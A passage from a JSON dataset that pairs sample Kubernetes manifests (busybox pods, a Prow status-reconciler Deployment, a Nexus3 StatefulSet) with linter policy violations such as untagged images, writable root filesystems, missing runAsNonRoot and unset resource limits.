    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: busybox\nspec:\n  volumes:\n  - name: myvolume1\n    emptyDir: {}\n  - name: myvolume2\n    emptyDir: {}\n  containers:\n  - name: busybox1\n    image: busybox:latest\n    command:\n    - /bin/sh\n    - -c\n    - sleep 600\n    volumeMounts:\n    - mountPath: /foo\n      name: myvolume1\n  - name: busybox2\n    image: busybox:latest\n    command:\n    - /bin/sh\n    - -c\n    - sleep 600\n    volumeMounts:\n    - mountPath: /bar\n      name: myvolume2\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"busybox1\" is using an invalid container image, \"busybox:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "01574",
    "manifest_path": "data/manifests/the_stack_sample/sample_0528.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: busybox\nspec:\n  volumes:\n  - name: myvolume1\n    emptyDir: {}\n  - name: myvolume2\n    emptyDir: {}\n  containers:\n  - name: busybox1\n    image: busybox:latest\n    command:\n    - /bin/sh\n    - -c\n    - sleep 600\n    volumeMounts:\n    - mountPath: /foo\n      name: myvolume1\n  - name: busybox2\n    image: busybox:latest\n    command:\n    - /bin/sh\n    - -c\n    - sleep 600\n    volumeMounts:\n    - mountPath: /bar\n      name: myvolume2\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"busybox2\" is using an invalid container image, \"busybox:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "01575",
    "manifest_path": "data/manifests/the_stack_sample/sample_0528.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: busybox\nspec:\n  volumes:\n  - name: myvolume1\n    emptyDir: {}\n  - name: myvolume2\n    emptyDir: {}\n  containers:\n  - name: busybox1\n    image: busybox:latest\n    command:\n    - /bin/sh\n    - -c\n    - sleep 600\n    volumeMounts:\n    - mountPath: /foo\n      name: myvolume1\n  - name: busybox2\n    image: busybox:latest\n    command:\n    - /bin/sh\n    - -c\n    - sleep 600\n    volumeMounts:\n    - mountPath: /bar\n      name: myvolume2\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"busybox1\" does not have a read-only root file system"
  },
  {
    "id": "01576",
    "manifest_path": "data/manifests/the_stack_sample/sample_0528.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: busybox\nspec:\n  volumes:\n  - name: myvolume1\n    emptyDir: {}\n  - name: myvolume2\n    emptyDir: {}\n  containers:\n  - name: busybox1\n    image: busybox:latest\n    command:\n    - /bin/sh\n    - -c\n    - sleep 600\n    volumeMounts:\n    - mountPath: /foo\n      name: myvolume1\n  - name: busybox2\n    image: busybox:latest\n    command:\n    - /bin/sh\n    - -c\n    - sleep 600\n    volumeMounts:\n    - mountPath: /bar\n      name: myvolume2\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"busybox2\" does not have a read-only root file system"
  },
  {
    "id": "01577",
    "manifest_path": "data/manifests/the_stack_sample/sample_0528.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: busybox\nspec:\n  volumes:\n  - name: myvolume1\n    emptyDir: {}\n  - name: myvolume2\n    emptyDir: {}\n  containers:\n  - name: busybox1\n    image: busybox:latest\n    command:\n    - /bin/sh\n    - -c\n    - sleep 600\n    volumeMounts:\n    - mountPath: /foo\n      name: myvolume1\n  - name: busybox2\n    image: busybox:latest\n    command:\n    - /bin/sh\n    - -c\n    - sleep 600\n    volumeMounts:\n    - mountPath: /bar\n      name: myvolume2\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"busybox1\" is not set to runAsNonRoot"
  },
  {
    "id": "01578",
    "manifest_path": "data/manifests/the_stack_sample/sample_0528.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: busybox\nspec:\n  volumes:\n  - name: myvolume1\n    emptyDir: {}\n  - name: myvolume2\n    emptyDir: {}\n  containers:\n  - name: busybox1\n    image: busybox:latest\n    command:\n    - /bin/sh\n    - -c\n    - sleep 600\n    volumeMounts:\n    - mountPath: /foo\n      name: myvolume1\n  - name: busybox2\n    image: busybox:latest\n    command:\n    - /bin/sh\n    - -c\n    - sleep 600\n    volumeMounts:\n    - mountPath: /bar\n      name: myvolume2\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"busybox2\" is not set to runAsNonRoot"
  },
  {
    "id": "01579",
    "manifest_path": "data/manifests/the_stack_sample/sample_0528.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: busybox\nspec:\n  volumes:\n  - name: myvolume1\n    emptyDir: {}\n  - name: myvolume2\n    emptyDir: {}\n  containers:\n  - name: busybox1\n    image: busybox:latest\n    command:\n    - /bin/sh\n    - -c\n    - sleep 600\n    volumeMounts:\n    - mountPath: /foo\n      name: myvolume1\n  - name: busybox2\n    image: busybox:latest\n    command:\n    - /bin/sh\n    - -c\n    - sleep 600\n    volumeMounts:\n    - mountPath: /bar\n      name: myvolume2\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"busybox1\" has cpu request 0"
  },
  {
    "id": "01580",
    "manifest_path": "data/manifests/the_stack_sample/sample_0528.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: busybox\nspec:\n  volumes:\n  - name: myvolume1\n    emptyDir: {}\n  - name: myvolume2\n    emptyDir: {}\n  containers:\n  - name: busybox1\n    image: busybox:latest\n    command:\n    - /bin/sh\n    - -c\n    - sleep 600\n    volumeMounts:\n    - mountPath: /foo\n      name: myvolume1\n  - name: busybox2\n    image: busybox:latest\n    command:\n    - /bin/sh\n    - -c\n    - sleep 600\n    volumeMounts:\n    - mountPath: /bar\n      name: myvolume2\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"busybox2\" has cpu request 0"
  },
  {
    "id": "01581",
    "manifest_path": "data/manifests/the_stack_sample/sample_0528.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: busybox\nspec:\n  volumes:\n  - name: myvolume1\n    emptyDir: {}\n  - name: myvolume2\n    emptyDir: {}\n  containers:\n  - name: busybox1\n    image: busybox:latest\n    command:\n    - /bin/sh\n    - -c\n    - sleep 600\n    volumeMounts:\n    - mountPath: /foo\n      name: myvolume1\n  - name: busybox2\n    image: busybox:latest\n    command:\n    - /bin/sh\n    - -c\n    - sleep 600\n    volumeMounts:\n    - mountPath: /bar\n      name: myvolume2\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"busybox1\" has memory limit 0"
  },
  {
    "id": "01582",
    "manifest_path": "data/manifests/the_stack_sample/sample_0528.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: busybox\nspec:\n  volumes:\n  - name: myvolume1\n    emptyDir: {}\n  - name: myvolume2\n    emptyDir: {}\n  containers:\n  - name: busybox1\n    image: busybox:latest\n    command:\n    - /bin/sh\n    - -c\n    - sleep 600\n    volumeMounts:\n    - mountPath: /foo\n      name: myvolume1\n  - name: busybox2\n    image: busybox:latest\n    command:\n    - /bin/sh\n    - -c\n    - sleep 600\n    volumeMounts:\n    - mountPath: /bar\n      name: myvolume2\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"busybox2\" has memory limit 0"
  },
  {
    "id": "01583",
    "manifest_path": "data/manifests/the_stack_sample/sample_0529.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-example\nspec:\n  containers:\n  - image: scheele/reverseproxy\n    name: reverseproxy\n    imagePullPolicy: Always\n    resources:\n      requests:\n        memory: 64Mi\n        cpu: 250m\n      limits:\n        memory: 1024Mi\n        cpu: 500m\n    ports:\n    - containerPort: 8080\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"reverseproxy\" is using an invalid container image, \"scheele/reverseproxy\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "01584",
    "manifest_path": "data/manifests/the_stack_sample/sample_0529.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-example\nspec:\n  containers:\n  - image: scheele/reverseproxy\n    name: reverseproxy\n    imagePullPolicy: Always\n    resources:\n      requests:\n        memory: 64Mi\n        cpu: 250m\n      limits:\n        memory: 1024Mi\n        cpu: 500m\n    ports:\n    - containerPort: 8080\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"reverseproxy\" does not have a read-only root file system"
  },
  {
    "id": "01585",
    "manifest_path": "data/manifests/the_stack_sample/sample_0529.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-example\nspec:\n  containers:\n  - image: scheele/reverseproxy\n    name: reverseproxy\n    imagePullPolicy: Always\n    resources:\n      requests:\n        memory: 64Mi\n        cpu: 250m\n      limits:\n        memory: 1024Mi\n        cpu: 500m\n    ports:\n    - containerPort: 8080\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"reverseproxy\" is not set to runAsNonRoot"
  },
  {
    "id": "01586",
    "manifest_path": "data/manifests/the_stack_sample/sample_0531.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: statusreconciler\n  labels:\n    app: statusreconciler\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: statusreconciler\n  template:\n    metadata:\n      labels:\n        app: statusreconciler\n    spec:\n      serviceAccountName: statusreconciler\n      containers:\n      - name: statusreconciler\n        image: gcr.io/k8s-prow/status-reconciler:v20210520-56277900f8\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --continue-on-error=true\n        - --plugin-config=/etc/plugins/plugins.yaml\n        - --config-path=/etc/config/config.yaml\n        - --github-token-path=/etc/github/oauth\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --job-config-path=/etc/job-config\n        - --denylist=kubernetes/kubernetes\n        volumeMounts:\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n      volumes:\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"statusreconciler\" does not have a read-only root file system"
  },
  {
    "id": "01587",
    "manifest_path": "data/manifests/the_stack_sample/sample_0531.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: statusreconciler\n  labels:\n    app: statusreconciler\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: statusreconciler\n  template:\n    metadata:\n      labels:\n        app: statusreconciler\n    spec:\n      serviceAccountName: statusreconciler\n      containers:\n      - name: statusreconciler\n        image: gcr.io/k8s-prow/status-reconciler:v20210520-56277900f8\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --continue-on-error=true\n        - --plugin-config=/etc/plugins/plugins.yaml\n        - --config-path=/etc/config/config.yaml\n        - --github-token-path=/etc/github/oauth\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --job-config-path=/etc/job-config\n        - --denylist=kubernetes/kubernetes\n        volumeMounts:\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n      volumes:\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"statusreconciler\" is not set to runAsNonRoot"
  },
  {
    "id": "01588",
    "manifest_path": "data/manifests/the_stack_sample/sample_0531.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: statusreconciler\n  labels:\n    app: statusreconciler\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: statusreconciler\n  template:\n    metadata:\n      labels:\n        app: statusreconciler\n    spec:\n      serviceAccountName: statusreconciler\n      containers:\n      - name: statusreconciler\n        image: gcr.io/k8s-prow/status-reconciler:v20210520-56277900f8\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --continue-on-error=true\n        - --plugin-config=/etc/plugins/plugins.yaml\n        - --config-path=/etc/config/config.yaml\n        - --github-token-path=/etc/github/oauth\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --job-config-path=/etc/job-config\n        - --denylist=kubernetes/kubernetes\n        volumeMounts:\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n      volumes:\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"statusreconciler\" has cpu request 0"
  },
  {
    "id": "01589",
    "manifest_path": "data/manifests/the_stack_sample/sample_0531.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: statusreconciler\n  labels:\n    app: statusreconciler\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: statusreconciler\n  template:\n    metadata:\n      labels:\n        app: statusreconciler\n    spec:\n      serviceAccountName: statusreconciler\n      containers:\n      - name: statusreconciler\n        image: gcr.io/k8s-prow/status-reconciler:v20210520-56277900f8\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --continue-on-error=true\n        - --plugin-config=/etc/plugins/plugins.yaml\n        - --config-path=/etc/config/config.yaml\n        - --github-token-path=/etc/github/oauth\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --job-config-path=/etc/job-config\n        - --denylist=kubernetes/kubernetes\n        volumeMounts:\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n      volumes:\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"statusreconciler\" has memory limit 0"
  },
  {
    "id": "01590",
    "manifest_path": "data/manifests/the_stack_sample/sample_0532.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: hostnamespaces1\nspec:\n  containers:\n  - image: k8s.gcr.io/pause\n    name: container1\n    securityContext:\n      allowPrivilegeEscalation: false\n  initContainers:\n  - image: k8s.gcr.io/pause\n    name: initcontainer1\n    securityContext:\n      allowPrivilegeEscalation: false\n  securityContext:\n    runAsNonRoot: true\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"container1\" is using an invalid container image, \"k8s.gcr.io/pause\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "01591",
    "manifest_path": "data/manifests/the_stack_sample/sample_0532.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: hostnamespaces1\nspec:\n  containers:\n  - image: k8s.gcr.io/pause\n    name: container1\n    securityContext:\n      allowPrivilegeEscalation: false\n  initContainers:\n  - image: k8s.gcr.io/pause\n    name: initcontainer1\n    securityContext:\n      allowPrivilegeEscalation: false\n  securityContext:\n    runAsNonRoot: true\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"initcontainer1\" is using an invalid container image, \"k8s.gcr.io/pause\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "01592",
    "manifest_path": "data/manifests/the_stack_sample/sample_0532.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: hostnamespaces1\nspec:\n  containers:\n  - image: k8s.gcr.io/pause\n    name: container1\n    securityContext:\n      allowPrivilegeEscalation: false\n  initContainers:\n  - image: k8s.gcr.io/pause\n    name: initcontainer1\n    securityContext:\n      allowPrivilegeEscalation: false\n  securityContext:\n    runAsNonRoot: true\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"container1\" does not have a read-only root file system"
  },
  {
    "id": "01593",
    "manifest_path": "data/manifests/the_stack_sample/sample_0532.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: hostnamespaces1\nspec:\n  containers:\n  - image: k8s.gcr.io/pause\n    name: container1\n    securityContext:\n      allowPrivilegeEscalation: false\n  initContainers:\n  - image: k8s.gcr.io/pause\n    name: initcontainer1\n    securityContext:\n      allowPrivilegeEscalation: false\n  securityContext:\n    runAsNonRoot: true\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"initcontainer1\" does not have a read-only root file system"
  },
  {
    "id": "01594",
    "manifest_path": "data/manifests/the_stack_sample/sample_0532.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: hostnamespaces1\nspec:\n  containers:\n  - image: k8s.gcr.io/pause\n    name: container1\n    securityContext:\n      allowPrivilegeEscalation: false\n  initContainers:\n  - image: k8s.gcr.io/pause\n    name: initcontainer1\n    securityContext:\n      allowPrivilegeEscalation: false\n  securityContext:\n    runAsNonRoot: true\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"container1\" has cpu request 0"
  },
  {
    "id": "01595",
    "manifest_path": "data/manifests/the_stack_sample/sample_0532.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: hostnamespaces1\nspec:\n  containers:\n  - image: k8s.gcr.io/pause\n    name: container1\n    securityContext:\n      allowPrivilegeEscalation: false\n  initContainers:\n  - image: k8s.gcr.io/pause\n    name: initcontainer1\n    securityContext:\n      allowPrivilegeEscalation: false\n  securityContext:\n    runAsNonRoot: true\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"initcontainer1\" has cpu request 0"
  },
  {
    "id": "01596",
    "manifest_path": "data/manifests/the_stack_sample/sample_0532.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: hostnamespaces1\nspec:\n  containers:\n  - image: k8s.gcr.io/pause\n    name: container1\n    securityContext:\n      allowPrivilegeEscalation: false\n  initContainers:\n  - image: k8s.gcr.io/pause\n    name: initcontainer1\n    securityContext:\n      allowPrivilegeEscalation: false\n  securityContext:\n    runAsNonRoot: true\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"container1\" has memory limit 0"
  },
  {
    "id": "01597",
    "manifest_path": "data/manifests/the_stack_sample/sample_0532.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: hostnamespaces1\nspec:\n  containers:\n  - image: k8s.gcr.io/pause\n    name: container1\n    securityContext:\n      allowPrivilegeEscalation: false\n  initContainers:\n  - image: k8s.gcr.io/pause\n    name: initcontainer1\n    securityContext:\n      allowPrivilegeEscalation: false\n  securityContext:\n    runAsNonRoot: true\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"initcontainer1\" has memory limit 0"
  },
  {
    "id": "01598",
    "manifest_path": "data/manifests/the_stack_sample/sample_0533.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: nexus3\n  namespace: default\n  labels:\n    app: nexus3\nspec:\n  selector:\n    matchLabels:\n      app: nexus3\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: nexus3\n    spec:\n      securityContext:\n        sysctls:\n        - name: net.ipv4.tcp_syncookies\n          value: '0'\n        - name: net.ipv4.ip_local_port_range\n          value: 1024 65535\n        - name: net.core.somaxconn\n          value: '65535'\n        - name: net.ipv4.ip_unprivileged_port_start\n          value: '0'\n        - name: net.ipv4.tcp_tw_reuse\n          value: '1'\n        - name: net.ipv4.tcp_fin_timeout\n          value: '30'\n        - name: net.ipv4.tcp_keepalive_intvl\n          value: '10'\n        - name: net.ipv4.tcp_keepalive_probes\n          value: '2'\n        - name: net.ipv4.tcp_keepalive_time\n          value: '120'\n        - name: net.ipv4.tcp_ecn\n          value: '1'\n        - name: net.ipv4.tcp_max_syn_backlog\n          value: '65536'\n        - name: net.ipv4.tcp_rfc1337\n          value: '1'\n        - name: net.ipv4.tcp_slow_start_after_idle\n          value: '0'\n        - name: net.ipv4.tcp_fack\n          value: '1'\n        - name: net.ipv4.tcp_max_tw_buckets\n          value: '262144'\n        - name: net.ipv4.tcp_fastopen\n          value: '3'\n        - name: net.ipv4.icmp_ratelimit\n          value: '100'\n        - name: net.ipv4.tcp_abort_on_overflow\n          value: '1'\n        - name: net.ipv4.tcp_adv_win_scale\n          value: '2'\n        - name: net.ipv4.tcp_retries2\n          value: '8'\n        - name: net.ipv4.tcp_syn_retries\n          value: '3'\n        - name: net.ipv4.tcp_synack_retries\n          value: '2'\n        - name: net.unix.max_dgram_qlen\n          value: '512'\n        - name: net.ipv4.tcp_fwmark_accept\n          value: '1'\n        - name: net.ipv4.fwmark_reflect\n          value: '1'\n      initContainers:\n      - name: volume-mount-uid\n        image: busybox\n        command:\n        - sh\n        - -c\n        - chown -R 200:200 /nexus-data\n        volumeMounts:\n        - name: nexus-data\n          mountPath: /nexus-data\n      containers:\n      - name: nexus3\n        image: sonatype/nexus3\n        imagePullPolicy: Always\n        livenessProbe:\n          httpGet:\n            path: /\n            port: 8081\n            scheme: HTTP\n          initialDelaySeconds: 60\n          timeoutSeconds: 5\n          successThreshold: 1\n          failureThreshold: 5\n        readinessProbe:\n          httpGet:\n            path: /\n            port: 8081\n            scheme: HTTP\n          initialDelaySeconds: 30\n          timeoutSeconds: 5\n          successThreshold: 1\n          failureThreshold: 5\n        resources:\n          requests:\n            cpu: 500m\n            memory: 1Gi\n          limits:\n            cpu: 8000m\n            memory: 8Gi\n        ports:\n        - name: web\n          containerPort: 8081\n        - name: docker\n          containerPort: 5003\n        volumeMounts:\n        - name: nexus-data\n          mountPath: /nexus-data\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nexus3\" is using an invalid container image, \"sonatype/nexus3\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "01599",
    "manifest_path": "data/manifests/the_stack_sample/sample_0533.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: nexus3\n  namespace: default\n  labels:\n    app: nexus3\nspec:\n  selector:\n    matchLabels:\n      app: nexus3\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: nexus3\n    spec:\n      securityContext:\n        sysctls:\n        - name: net.ipv4.tcp_syncookies\n          value: '0'\n        - name: net.ipv4.ip_local_port_range\n          value: 1024 65535\n        - name: net.core.somaxconn\n          value: '65535'\n        - name: net.ipv4.ip_unprivileged_port_start\n          value: '0'\n        - name: net.ipv4.tcp_tw_reuse\n          value: '1'\n        - name: net.ipv4.tcp_fin_timeout\n          value: '30'\n        - name: net.ipv4.tcp_keepalive_intvl\n          value: '10'\n        - name: net.ipv4.tcp_keepalive_probes\n          value: '2'\n        - name: net.ipv4.tcp_keepalive_time\n          value: '120'\n        - name: net.ipv4.tcp_ecn\n          value: '1'\n        - name: net.ipv4.tcp_max_syn_backlog\n          value: '65536'\n        - name: net.ipv4.tcp_rfc1337\n          value: '1'\n        - name: net.ipv4.tcp_slow_start_after_idle\n          value: '0'\n        - name: net.ipv4.tcp_fack\n          value: '1'\n        - name: net.ipv4.tcp_max_tw_buckets\n          value: '262144'\n        - name: net.ipv4.tcp_fastopen\n          value: '3'\n        - name: net.ipv4.icmp_ratelimit\n          value: '100'\n        - name: net.ipv4.tcp_abort_on_overflow\n          value: '1'\n        - name: net.ipv4.tcp_adv_win_scale\n          value: '2'\n        - name: net.ipv4.tcp_retries2\n          value: '8'\n        - name: net.ipv4.tcp_syn_retries\n          value: '3'\n        - name: net.ipv4.tcp_synack_retries\n          value: '2'\n        - name: net.unix.max_dgram_qlen\n          value: '512'\n        - name: net.ipv4.tcp_fwmark_accept\n          value: '1'\n        - name: net.ipv4.fwmark_reflect\n          value: '1'\n      initContainers:\n      - name: volume-mount-uid\n        image: busybox\n        command:\n        - sh\n        - -c\n        - chown -R 200:200 /nexus-data\n        volumeMounts:\n        - name: nexus-data\n          mountPath: /nexus-data\n      containers:\n      - name: nexus3\n        image: sonatype/nexus3\n        imagePullPolicy: Always\n        livenessProbe:\n          httpGet:\n            path: /\n            port: 8081\n            scheme: HTTP\n          initialDelaySeconds: 60\n          timeoutSeconds: 5\n          successThreshold: 1\n          failureThreshold: 5\n        readinessProbe:\n          httpGet:\n            path: /\n            port: 8081\n            scheme: HTTP\n          initialDelaySeconds: 30\n          timeoutSeconds: 5\n          successThreshold: 1\n          failureThreshold: 5\n        resources:\n          requests:\n            cpu: 500m\n            memory: 1Gi\n          limits:\n            cpu: 8000m\n            memory: 8Gi\n        ports:\n        - name: web\n          containerPort: 8081\n        - name: docker\n          containerPort: 5003\n        volumeMounts:\n        - name: nexus-data\n          mountPath: /nexus-data\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"volume-mount-uid\" is using an invalid container image, \"busybox\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "01600",
    "manifest_path": "data/manifests/the_stack_sample/sample_0533.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: nexus3\n  namespace: default\n  labels:\n    app: nexus3\nspec:\n  selector:\n    matchLabels:\n      app: nexus3\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: nexus3\n    spec:\n      securityContext:\n        sysctls:\n        - name: net.ipv4.tcp_syncookies\n          value: '0'\n        - name: net.ipv4.ip_local_port_range\n          value: 1024 65535\n        - name: net.core.somaxconn\n          value: '65535'\n        - name: net.ipv4.ip_unprivileged_port_start\n          value: '0'\n        - name: net.ipv4.tcp_tw_reuse\n          value: '1'\n        - name: net.ipv4.tcp_fin_timeout\n          value: '30'\n        - name: net.ipv4.tcp_keepalive_intvl\n          value: '10'\n        - name: net.ipv4.tcp_keepalive_probes\n          value: '2'\n        - name: net.ipv4.tcp_keepalive_time\n          value: '120'\n        - name: net.ipv4.tcp_ecn\n          value: '1'\n        - name: net.ipv4.tcp_max_syn_backlog\n          value: '65536'\n        - name: net.ipv4.tcp_rfc1337\n          value: '1'\n        - name: net.ipv4.tcp_slow_start_after_idle\n          value: '0'\n        - name: net.ipv4.tcp_fack\n          value: '1'\n        - name: net.ipv4.tcp_max_tw_buckets\n          value: '262144'\n        - name: net.ipv4.tcp_fastopen\n          value: '3'\n        - name: net.ipv4.icmp_ratelimit\n          value: '100'\n        - name: net.ipv4.tcp_abort_on_overflow\n          value: '1'\n        - name: net.ipv4.tcp_adv_win_scale\n          value: '2'\n        - name: net.ipv4.tcp_retries2\n          value: '8'\n        - name: net.ipv4.tcp_syn_retries\n          value: '3'\n        - name: net.ipv4.tcp_synack_retries\n          value: '2'\n        - name: net.unix.max_dgram_qlen\n          value: '512'\n        - name: net.ipv4.tcp_fwmark_accept\n          value: '1'\n        - name: net.ipv4.fwmark_reflect\n          value: '1'\n      initContainers:\n      - name: volume-mount-uid\n        image: busybox\n        command:\n        - sh\n        - -c\n        - chown -R 200:200 /nexus-data\n        volumeMounts:\n        - name: nexus-data\n          mountPath: /nexus-data\n      containers:\n      - name: nexus3\n        image: sonatype/nexus3\n        imagePullPolicy: Always\n        livenessProbe:\n          httpGet:\n            path: /\n            port: 8081\n            scheme: HTTP\n          initialDelaySeconds: 60\n          timeoutSeconds: 5\n          successThreshold: 1\n          failureThreshold: 5\n        readinessProbe:\n          httpGet:\n            path: /\n            port: 8081\n            scheme: HTTP\n          initialDelaySeconds: 30\n          timeoutSeconds: 5\n          successThreshold: 1\n          failureThreshold: 5\n        resources:\n          requests:\n            cpu: 500m\n            memory: 1Gi\n          limits:\n            cpu: 8000m\n            memory: 8Gi\n        ports:\n        - name: web\n          containerPort: 8081\n        - name: docker\n          containerPort: 5003\n        volumeMounts:\n        - name: nexus-data\n          mountPath: /nexus-data\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nexus3\" does not have a read-only root file system"
  },
  {
    "id": "01601",
    "manifest_path": "data/manifests/the_stack_sample/sample_0533.yaml",
